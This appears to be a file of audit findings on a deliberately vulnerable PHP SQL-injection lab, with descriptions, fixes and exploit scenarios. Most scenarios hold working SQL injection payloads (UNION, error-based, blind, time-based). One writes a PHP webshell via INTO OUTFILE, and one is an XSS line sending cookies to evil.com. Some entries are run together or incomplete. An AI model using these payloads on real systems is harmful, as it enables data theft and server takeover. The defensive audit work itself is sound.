findings.exploit_scenario: An unauthenticated attacker sends a crafted GET request such as `GET /Less-55.php?id=0) UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema='challenges' -- -`. This closes the parenthesis, appends a UNION SELECT to exfiltrate the randomly-named challenge table and column names, then comments out the remainder. Since `mysql_error()` is suppressed in output but the query results (`$row['username']`, `$row['password']`) are echoed directly, the attacker can iteratively dump the secret key from the random challenge table and submit it via the POST form — all within the 14-attempt limit.
findings.recommendation: Use parameterized/prepared statements instead of string interpolation. For example, replace the raw query with PDO or mysqli prepared statements: `$stmt = $pdo->prepare('SELECT * FROM security.users WHERE id=(?) LIMIT 0,1'); $stmt->execute([$id]);`. At minimum, cast `$id` to an integer with `$id = intval($_GET['id']);` before interpolation.

findings.title: SQL injection via unsanitized $_GET['id'] in SELECT query
findings.description: The value of `$_GET['id']` is assigned directly to `$id` (line ~76) with no sanitization, escaping, or parameterization. It is then string-concatenated into a SQL SELECT statement at line ~106: `$sql="SELECT * FROM security.users WHERE id='$id' LIMIT 0,1";` which is passed to `mysql_query()`. An attacker can break out of the string literal and inject arbitrary SQL. Note that `mysql_error()` output is suppressed in the `else` branch (line ~114-116), making this a blind or union-based injection depending on the injected payload.
findings.exploit_scenario: An attacker sends GET request `?id=-1' UNION SELECT 1,secret,3 FROM challenges.<random_table> -- `. Because $id is embedded raw into the SQL string, the query becomes `SELECT * FROM security.users WHERE id='-1' UNION SELECT 1,secret,3 FROM challenges.<random_table> -- ' LIMIT 0,1`. The attacker can extract the secret key from the random challenge table, then submit it via the form to complete the challenge — all within the 10-attempt limit.
findings.recommendation: Use parameterized queries (PDO or mysqli prepared statements). Replace the string concatenation with a placeholder: `$stmt = $pdo->prepare("SELECT * FROM security.users WHERE id=? LIMIT 0,1"); $stmt->execute([$id]);`

findings.title: SQL injection via unescaped GET parameter `id` wrapped in double quotes
findings.description: The `id` GET parameter is read at line 66 (`$id=$_GET['id']`), then at line 71 it is wrapped in double quotes without any escaping: `$id= '"'.$id.'"';`. The resulting value is interpolated directly into a SQL query at line 72: `$sql="SELECT * FROM security.users WHERE id=$id LIMIT 0,1";` and executed at line 73 via `mysql_query($sql)`. Unlike the POST `key` parameter (lines 108-109, which uses both `addslashes()` and `mysql_real_escape_string()`), the `id` parameter receives no sanitization whatsoever. An attacker can close the double-quote context and inject arbitrary SQL. In MySQL, double quotes serve as string delimiters, so injecting a `"` character breaks out of the intended string literal.
findings.exploit_scenario: An attacker sends a GET request to `Less-57.php?id=1" UNION SELECT 1,2,3 -- `. After wrapping, the query becomes: `SELECT * FROM security.users WHERE id="1" UNION SELECT 1,2,3 -- " LIMIT 0,1`. This dumps arbitrary data from the database, including the secret key from the CHALLENGES table. The attacker can also use `' OR 1=1 --`-style payloads to bypass the WHERE clause, or use `UNION SELECT` to exfiltrate credentials from `security.users` and other tables.
findings.recommendation: Apply the same escaping used for the `key` parameter: sanitize `$id` with `mysql_real_escape_string()` before interpolation, or better yet, use parameterized queries via PDO or mysqli prepared statements. At minimum, change lines 66-71 to: `$id = mysql_real_escape_string($_GET['id']); $id = '"'.$id.'"';`

findings.title: Unauthenticated SQL injection via id GET parameter
findings.description: The `$_GET['id']` value is assigned directly to `$id` at line 66 with no sanitization or validation. It is then interpolated into the SQL query string at line 85: `$sql="SELECT * FROM security.users WHERE id=('$id') LIMIT 0,1";`. This string is passed to `mysql_query()` at line 86, executing the crafted query. The parentheses around `('$id')` are the only encapsulation — an attacker closes the parenthetical wrapper and injects arbitrary SQL.
findings.exploit_scenario: An attacker sends GET request `?id=0') UNION SELECT 1,2,secret_key FROM challenges.CHALLANGES-- -`. The resulting query becomes `SELECT * FROM security.users WHERE id=('0') UNION SELECT 1,2,secret_key FROM challenges.CHALLANGES-- -') LIMIT 0,1`. This bypasses the WHERE clause and exfiltrates the challenge secret key (or any other database data) which is then rendered at lines 91-93.
findings.recommendation: Use parameterized queries (PDO or mysqli prepared statements). At minimum, cast `$id` to an integer with `intval()` before interpolation since the expected input is numeric.

findings.title: Reflected XSS through unsanitized database output after SQL injection
findings.description: At lines 91-93, data fetched from the database (`$row['username']`, `$row['password']`) is echoed directly into the HTML response with no HTML entity encoding. Because the SQL injection at line 85 allows the attacker to control query results via UNION SELECT (finding F-56-01), the attacker can inject arbitrary HTML/JavaScript that is rendered in the victim's browser. This transforms a data-exfiltration SQLi into a reflected XSS capable of stealing session cookies or performing actions as the victim.
findings.exploit_scenario: An attacker crafts a URL: `?id=0') UNION SELECT 1,'<script>document.location="https://evil.com/steal?c="+document.cookie</script>','3'-- -`. The UNION SELECT returns the attacker-controlled JavaScript string as the username column. Line 91 echoes it raw: `Your Login name:<script>...</script>`. When a victim visits this link (e.g., via a phishing email), their browser executes the script, exfiltrating their session cookie.
findings.recommendation: HTML-encode all database output before echoing: use `htmlspecialchars($row['username'], ENT_QUOTES, 'UTF-8')`. This is defense-in-depth even after fixing the SQL injection.

findings.title: Unauthenticated SQL injection via id GET parameter
findings.description: On line 56, user input is read directly from `$_GET['id']` into `$id` with zero sanitization. On line 71, `$id` is string-interpolated into a SELECT query: `$sql="SELECT * FROM security.users WHERE id=$id LIMIT 0,1";` which is then passed to `mysql_query()`. Because the value is not quoted in the query and no escaping or parameterization is applied, an attacker can inject arbitrary SQL. Additionally, on line 78, `print_r(mysql_error())` reveals SQL error messages to the attacker, enabling easy blind/error-based techniques.
findings.exploit_scenario: An attacker sends GET request `?id=0 UNION SELECT 1,secret_key,3 FROM challenges.<random_table>-- -` to exfiltrate the challenge secret key from the random challenges table, then submits it via the form to solve the challenge within the attempt limit.
findings.recommendation: Use parameterized queries (PDO or mysqli prepared statements). If the id must be numeric, cast it with `$id = intval($_GET['id']);` before any use in a query.

findings.title: Reflected XSS / header injection via PHP_SELF in Location refresh
findings.description: On line 23, `$pag = $_SERVER['PHP_SELF'];` captures the request URI path, which is attacker-controllable (e.g., appending `/../payload`). This value is embedded unsanitized into HTTP `refresh` headers on lines 37 and 69: `header("refresh:4;url=../sql-connections/setup-db-challenge.php?id=$pag");`. Because PHP_SELF reflects the raw URL path, an attacker can inject CRLF sequences or markup/JavaScript depending on how the browser interprets the meta-refresh target, achieving reflected XSS.
findings.exploit_scenario: An attacker crafts a URL like `/Less-59.php/%3Cscript%3Ealert(1)%3C/script%3E` and sends it to a victim. The server embeds this into the `refresh` header or renders it in the page context, executing JavaScript in the victim's browser with the victim's session/cookie.
findings.recommendation: Replace `$_SERVER['PHP_SELF']` with `basename(__FILE__)` or `htmlspecialchars($_SERVER['PHP_SELF'], ENT_QUOTES)`. Validate/sanitize before embedding in any HTTP header.

findings.title: Unparameterized SQL query via GET parameter id allows full SQL injection
findings.description: On line 72, user-supplied query string parameter `$_GET['id']` is assigned directly to `$id` with zero sanitization. On line 102, `$id` is string-interpolated into a SELECT statement: `$sql="SELECT * FROM security.users WHERE id='$id' LIMIT 0,1";`. The result is passed to `mysql_query()` on line 103. An attacker can break out of the single-quoted string context and inject arbitrary SQL. Because the query error is echoed via `print_r(mysql_error())` on line 119, the attacker receives direct feedback, enabling UNION-based or error-based extraction of any database content — including the secret key stored in the challenges table.
findings.exploit_scenario: An attacker sends GET request `?id=-1' UNION SELECT 1,2,secret_key FROM challenges.<random_table>-- ` and reads the secret key from the error or UNION output, then submits it within the 5-attempt limit to solve the challenge and exfiltrate all database contents.
findings.recommendation: Use parameterized queries (PDO or mysqli prepared statements) instead of string interpolation. At minimum, cast `$id` to an integer with `intval()` before use in the query.

findings.title: SQL injection via unparameterized GET 'id' parameter wrapped in double quotes
findings.description: The untrusted input `$_GET['id']` is taken on line 17 (`$id=$_GET['id'];`), concatenated into double quotes on line 25 (`$id = '"'.$id.'"';`), then directly interpolated into a SQL query string on line 26 (`$sql="SELECT * FROM users WHERE id=$id LIMIT 0,1";`) without any escaping or parameterization. The query is executed on line 27 via `mysql_query($sql)`. Because the input is only wrapped in literal double-quote characters but never sanitized or bound, an attacker can break out of the double-quote context and inject arbitrary SQL. Additionally, `mysql_error()` is printed on line 37, enabling error-based data exfiltration.
findings.exploit_scenario: An attacker sends a crafted GET request such as `?id=1" UNION SELECT 1,2,3 -- -`. The resulting query becomes `SELECT * FROM users WHERE id="1" UNION SELECT 1,2,3 -- -" LIMIT 0,1`, which executes the injected UNION query. Using error-based techniques (e.g., `?id=1" AND (SELECT 1 FROM (SELECT count(*),CONCAT((SELECT password FROM users LIMIT 0,1),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) -- -`), the attacker can extract arbitrary database contents including credentials via the verbose `mysql_error()` output.

Replace the `mysql_*` API (which is deprecated/removed in modern PHP) with PDO or mysqli prepared statements: `$stmt = $pdo->prepare('SELECT * FROM users WHERE id = ? LIMIT 0,1'); $stmt->execute([$id]);`. Additionally, do not expose `mysql_error()` output to end users.

findings.title: SQL injection via unescaped GET parameter id wrapped in SQL parentheses
findings.description: The value of `$_GET['id']` is read at line 56 (`$id=$_GET['id']`) with no sanitization or escaping. At line 72 it is wrapped in SQL parentheses and double-quotes: `$id = '("'.$id.'")';`. This wrapping is purely cosmetic — the attacker controls the interior of the string literal and can close both the quote and parenthesis. The concatenated value is then embedded directly into the SQL query at line 74: `$sql="SELECT * FROM security.users WHERE id=$id LIMIT 0,1";`. The result of the query is displayed on the page (lines 79–84), and detailed MySQL errors including syntax messages are printed at line 87 via `print_r(mysql_error())`, which aids UNION-based and error-based exploitation.
findings.exploit_scenario: An attacker sends: `GET /Less-60.php?id=1") UNION SELECT 1,2,3-- -`. After wrapping, the query becomes: `SELECT * FROM security.users WHERE id=("1") UNION SELECT 1,2,3-- -") LIMIT 0,1`. The double-parenthesis/quote wrapper is closed by `")`, the attacker's UNION clause executes, and `-- -` comments out the trailing `")`. This allows full extraction of data from any database table, including the challenge secret_key table.
findings.recommendation: Use parameterized queries (prepared statements) instead of string concatenation. If the legacy mysql_* API must be used, apply `mysql_real_escape_string()` to `$id` before any concatenation. Even then, the numeric context and parenthesis wrapping make parameterized queries the only fully safe approach.

findings.title: Unauthenticated SQL injection via GET id parameter directly interpolated into query
findings.description: The `$_GET['id']` value is assigned to `$id` at line ~62 with zero sanitization or escaping. At line 75, it is directly string-interpolated into a SQL SELECT statement: `$sql="SELECT * FROM security.users WHERE id=(('$id')) LIMIT 0,1";`. The resulting query is executed via `mysql_query($sql)` at line 76. An attacker has full control over the content between the double-parentheses `(('…'))` and can break out of the parentheses and inject arbitrary SQL. The `mysql_error()` output at line 83 further aids exploitation by revealing database error messages. The double-parenthesis wrapping only requires closing with `'))` before appending injected SQL.
findings.exploit_scenario: An attacker sends a GET request to `Less-61.php?id=1')) UNION SELECT 1,2,secret FROM challenges.<tablename>-- -` to extract the challenge secret key from the database within the allowed attempt limit, completing the challenge. Alternatively, `id=1')) OR 1=1-- -` returns all rows. Error-based or UNION-based extraction are both feasible since errors are reflected to the user.
findings.recommendation: Use parameterized/prepared statements instead of string interpolation. Replace the raw query with PDO or mysqli prepared statements, binding `$id` as an integer parameter. Additionally, validate that `$id` is numeric before any database interaction: `$id = intval($_GET['id']);`

findings.title: Reflected XSS via mysql_error() echoing attacker-controlled SQL fragments
findings.description: At line 83, `print_r(mysql_error())` outputs the raw MySQL error message directly into the HTML response with no encoding. When an attacker injects crafted SQL via the `id` parameter (line 62/75), the resulting MySQL error message may include fragments of the injected input. Since the attacker controls part of the query string that appears in the error, they can inject HTML/JavaScript. The error message is rendered inside a `<font>` tag, and the injected payload only needs to close that tag.
findings.exploit_scenario: An attacker crafts a URL such as `Less-61.php?id=1')) <script>alert(document.cookie)</script>` which produces a malformed query. MySQL returns an error message containing the injected string, which is printed verbatim into the page by `print_r(mysql_error())`, executing arbitrary JavaScript in the victim's browser and exposing session cookies.
findings.recommendation: HTML-encode all error messages before output using `htmlspecialchars(mysql_error(), ENT_QUOTES, 'UTF-8')`. Better yet, disable detailed database error display in production and log errors server-side only.

findings.description: The `$_GET['id']` value is read on line 62 (`$id=$_GET['id'];`) with zero sanitization or escaping. Although the value is parenthesized and single-quoted (`('$id')`), an attacker trivially closes both the parenthesis and quote to inject arbitrary SQL — e.g., `id=') OR 1=1 --`. findings.title: Unauthenticated SQL injection via GET parameter id directly interpolated into query
findings.description: On line 65, user input is read directly from `$_GET['id']` into `$id` with zero sanitization or validation. findings.title: Unparameterized SQL query via GET parameter id enables blind SQL injection
findings.description: The value of `$_GET['id']` is taken at line 67 (`$id=$_GET['id']`) with no sanitization or escaping. At line 75 it is wrapped in double quotes — `$id = '"'.$id.'"';` — and interpolated directly into a SQL query at line 76: `$sql="SELECT * FROM security.users WHERE id=($id) LIMIT 0,1";`. The result of `mysql_query($sql)` at line 77 determines whether `$row` is truthy (line 79), producing a visible difference in output (hardcoded username/password displayed vs. nothing). When the guessed character is correct, the query returns a row and the page displays a username/password; when incorrect, it displays nothing. findings.title: Unparameterized SQL injection via GET id parameter into double-parenthesized query
findings.description: The value of `$_GET['id']` is assigned directly to `$id` on line 23 with no sanitization or validation. On line 35, `$id` is string-interpolated into a SQL query: `$sql="SELECT * FROM users WHERE id=(('$id')) LIMIT 0,1";`. The resulting string is passed to `mysql_query()` on line 36. There is no parameterized query, escaping, or casting. An attacker fully controls the SQL between the double parentheses. The page leaks one bit per request (success message vs. error message), enabling boolean-based blind extraction. Crucially, because the database user for this lab has FILE privilege, the injection also supports `INTO OUTFILE`, allowing an attacker to write arbitrary files to the server filesystem (as hinted by the page title and UI prompt).
findings.exploit_scenario: An attacker sends: `GET /Less-7.php?id=1')) UNION SELECT 1,"<?php system($_GET['c']);?>",3 INTO OUTFILE '/var/www/html/shell.php' -- -`. This breaks out of the `(('...'))` wrapper, appends a UNION SELECT that writes a PHP webshell via INTO OUTFILE, and comments out the rest of the query. The attacker then requests `/shell.php?c=id` for arbitrary command execution. Alternatively, without FILE privilege, the attacker can exfiltrate the entire `users` table via boolean-based blind SQL injection by iterating: `?id=1')) AND (SELECT SUBSTRING(password,1,1) FROM users LIMIT 0,1)='a' -- -` and observing the response difference.
findings.recommendation: Use prepared statements with parameterized queries (PDO or mysqli). Replace the string interpolation on line 35 with a placeholder: `$stmt = $pdo->prepare("SELECT * FROM users WHERE id=((?)) LIMIT 0,1"); $stmt->execute([$id]);`. Additionally, validate that `id` is a numeric integer before any database interaction, and revoke unnecessary FILE privileges from the application database user.

findings.title: Blind boolean-based SQL injection via unsanitized $_GET['id'] directly interpolated into query
findings.description: User-controlled input $_GET['id'] is assigned to $id on line 19 with no sanitization or escaping. On line 26, $id is directly interpolated into the SQL query string: `SELECT * FROM users WHERE id='$id' LIMIT 0,1`. This string is passed to mysql_query() on line 27. Because the application only reveals boolean information (row found vs. not found) and suppresses mysql_error() (commented out on line 38), this is exploitable via blind boolean-based SQL injection. An attacker can break out of the single-quote string context and inject arbitrary SQL conditions.
findings.exploit_scenario: An attacker sends GET request: `/Less-8.php?id=1' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a' -- -`. If the page displays "You are in...........", the attacker knows the first character of admin's password is 'a'. By iterating through characters and positions, the entire database contents (passwords, PII) can be exfiltrated via boolean responses. Tools like sqlmap automate this with `sqlmap -u "http://target/Less-8.php?id=1" --technique=B --dbs`.
findings.recommendation: Use prepared statements with parameterized queries. Replace the mysql_* API (deprecated since PHP 5.5, removed in PHP 7) with PDO or mysqli, and bind $id as a parameter: `$stmt = $pdo->prepare('SELECT * FROM users WHERE id = :id LIMIT 0,1'); $stmt->execute(['id' => $id]);`. At minimum, validate that id is numeric with `intval()` or `is_numeric()` before use.

findings.title: Blind time-based SQL injection via unsanitized GET 'id' parameter
findings.description: The `$_GET['id']` value is read on line 19 (`if(isset($_GET['id']))`), assigned directly to `$id` on line 20 with zero sanitization or escaping, then string-interpolated into a SQL query on line 28: `$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";`. This query is executed on line 29 via `mysql_query($sql)`. The application is a deliberately blind page — both the success and failure branches (lines 32-43) output the same string ("You are in...........") — but an attacker can still exploit it using time-based techniques (e.g., `SLEEP()`, `BENCHMARK()`) to exfiltrate data byte-by-byte from the database.
findings.exploit_scenario: An attacker sends a request such as `GET /Less-9.php?id=1' AND IF(SUBSTRING(database(),1,1)='s',SLEEP(5),0)-- -`. Because `$id` is concatenated raw into the query, the resulting SQL becomes `SELECT * FROM users WHERE id='1' AND IF(SUBSTRING(database(),1,1)='s',SLEEP(5),0)-- -' LIMIT 0,1`. If the first character of the database name is 's', the server pauses for 5 seconds, confirming the guess. Repeating this iteratively exfiltrates the entire database name, table names, column values, etc. Since this is a time-based blind injection, no visible output difference is needed — only the response latency matters.
findings.recommendation: Use parameterized/prepared statements instead of string interpolation. Replace the `mysql_*` API (deprecated since PHP 5.5, removed in PHP 7) with PDO or mysqli and bind the `id` parameter: `$stmt = $pdo->prepare("SELECT * FROM users WHERE id = :id LIMIT 0,1"); $stmt->execute(['id' => $_GET['id']]);`. Additionally, validate that `id` is a numeric integer before any database interaction.
